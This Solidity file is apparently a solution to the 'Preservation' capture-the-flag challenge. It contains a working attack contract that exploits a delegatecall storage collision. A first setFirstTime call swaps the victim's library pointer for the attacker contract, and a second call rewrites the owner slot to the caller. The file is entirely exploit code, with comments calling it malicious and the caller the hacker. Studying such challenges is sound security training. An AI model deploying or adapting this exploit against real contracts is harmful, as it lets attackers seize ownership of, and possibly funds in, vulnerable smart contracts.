// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Preservation.sol';

contract AttackPreservation{
    // maintain the preservation's variable declaration order and type
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;

    Preservation immutable victim; 

    constructor(Preservation _victim) {
        victim = _victim; 
    }

    function attack() external {
	    // update the victim's timeZone1Library address with our malicious contract address
        victim.setFirstTime(uint160(address(this)));
	   
        require(victim.timeZone1Library() == address(this) , 
        "timeZone1Library address is not our malicious contract address!");
        
        // update the victim's owner address with the hacker address
        // the setTime function is now able to change the slot 2 storage of the victim contract
        // because the setFirstTime function delegate a call to our setTime implementation this time 
        victim.setFirstTime(uint160(msg.sender));
    }

    function setTime(uint _owner) public {
        owner = address(uint160(_owner));
    }
}